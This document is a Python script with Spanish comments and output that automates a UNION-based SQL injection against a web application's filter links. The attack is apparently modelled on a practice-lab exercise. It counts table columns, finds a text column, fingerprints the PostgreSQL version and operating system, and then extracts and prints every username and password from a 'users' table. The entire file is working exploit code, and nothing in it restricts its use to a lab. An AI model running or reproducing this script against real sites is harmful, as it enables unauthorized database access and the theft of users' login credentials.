import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def obtener_credenciales_acceso(url, uri, numero_columnas_bd, columna_string, bbdd):
    PARSER = 'html.parser'
    caracter_concatenacion = ''
    if bbdd == 'PostgreSQL':
        caracter_concatenacion = '||'
    cadena_credenciales = '+username+' + caracter_concatenacion + "+'-'+" + caracter_concatenacion + '+password'
    
    array_nulos = ['NULL'] * numero_columnas_bd
    array_nulos[columna_string-1] = cadena_credenciales
    sql_payload = "'+UNION+SELECT+" + ','.join(map(str,array_nulos)) + "+FROM+users"
    respuesta_normal = requests.get(url + uri[1:], verify=False)
    respuesta_vulnerada = requests.get(url + uri[1:] + sql_payload + "-- - ", verify=False)
    
      
    print("\nURI de ataque:\n")
    print(url + uri[1:] + sql_payload + "-- - " + "\n")
    
    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('th')
    lista_th_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('th')

    credenciales = []
    
    for th in lista_th_vulnerada:
        if th not in lista_th_normal:
            credenciales.append(th)
    
    print("Credenciales de acceso al sistema:")
    color_azul = "\033[94m"
    reset_color = "\033[0m"
    print(color_azul)
    for credencial in credenciales:
        print(credencial.get_text())
    print(reset_color)
    print("[+] La ejecución del script ha terminado satisfactoriamente.")
            
def determinar_bbdd(url, uri, numero_columnas_bd, columna_string):
    PARSER = 'html.parser'
    
    # postgresql
    array_nulos = ['NULL'] * numero_columnas_bd
    array_nulos[columna_string-1] = "version()"
    sql_payload = "'+UNION+SELECT+" + ','.join(map(str,array_nulos))
    respuesta_vulnerada = requests.get(url + uri[1:] + sql_payload + "-- - ", verify=False)
    respuesta_normal = requests.get(url + uri[1:], verify=False)
    
    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('th')
    lista_th_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('th')
    
    if respuesta_vulnerada.status_code // 100 == 2:
        print("[+] Tipo de base de datos: PostgreSQL")

    th_bbdd = []
    
    for th in lista_th_vulnerada:
        if th not in lista_th_normal:
            th_bbdd.append(th)
            
    cadena = th_bbdd[0].get_text()
    
    inicio_parentesis = cadena.find("(")
    fin_parentesis = cadena.find(")")
    version_postgresql = cadena[:inicio_parentesis].strip()
    sistema_operativo = cadena[inicio_parentesis + 1 : fin_parentesis].strip()

    arquitectura_sistema = [parte for parte in cadena.split(",")][-1].strip()
    
    print("[+] Versión de PostgreSQL:", version_postgresql)
    print("[+] Sistema Operativo:", sistema_operativo)
    print("[+] Arquitectura del Sistema:", arquitectura_sistema)
    
    return 'PostgreSQL'
            
def obtener_fila_string(url, uri, numero_columnas_bd):
    string_prueba = "'a'"

    for i in range(numero_columnas_bd):
        array_nulos = ['NULL'] * numero_columnas_bd
        array_nulos[i] = string_prueba
        sql_payload = "'+UNION+SELECT+" + ','.join(map(str,array_nulos))
        respuesta = requests.get(url + uri[1:] + sql_payload + "-- - ", verify=False)
        if respuesta.status_code // 100 == 2:
            print("[+] Columna que contiene un tipo de dato string: %i" % (i+1))
            return i+1
    return False

def obtener_numero_columnas_tabla(url, uri):
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        peticion = requests.get(url+uri[1:]+sql_payload+"-- - ", verify=False)
        if peticion.status_code // 100 ==  2:
            print("\nInformación obtenida:\n")
            print('[+] Numero de columnas: %i' % i)
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1
    return False

def obtener_enlace_ataque(url):
    peticion = requests.get(url)
    html = peticion.text
    soup = BeautifulSoup(html,'html.parser')
    section = soup.findAll('section')
    section_filtros = section[len(section)-1]
    enlaces = section_filtros.findAll('a')
    print("\nLista de enlaces de interes:\n")
    for i in range(1,len(enlaces)):
        print (str(i) + ". " + enlaces[i].contents[0])
    print("\n¿Desde que enlace desea realizar el ataque?: ", end="")
    enlace_ataque = int(input())
    return enlaces[enlace_ataque]['href']

def es_url_valida(url):
    try:
        respuesta = requests.get(url)
        if respuesta.status_code // 100 == 2:
            return True
        else:
            return False
    except requests.ConnectionError:
        return False
    

if __name__ == "__main__":
    print("\nAtaque de inyección SQL, recuperando mútiples valores en una sola columna")
    print("--------------------------------------------------------------------.----")
    print("[+] Utilización: python3 sqlInjectionAttackRetrievingMultipleValuesInASingleColumn.py <url>")
     
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Debe ingresar una URL, inténtelo nuevamente.")
        print("Saliendo del sistema.")
        sys.exit(-1)

    if es_url_valida(url):
        print("[+] URL válida. Procediendo con la ejecución del script...")
        uri = obtener_enlace_ataque(url)
        numero_columnas_bd = obtener_numero_columnas_tabla(url, uri)
        columna_string = obtener_fila_string(url, uri, numero_columnas_bd)
        bbdd = determinar_bbdd(url, uri, numero_columnas_bd, columna_string)
        obtener_credenciales_acceso(url,uri,numero_columnas_bd,columna_string,bbdd)
    else:
        print("[-] URL inválida. Saliendo del sistema.")
        sys.exit(-1)

    
        

     
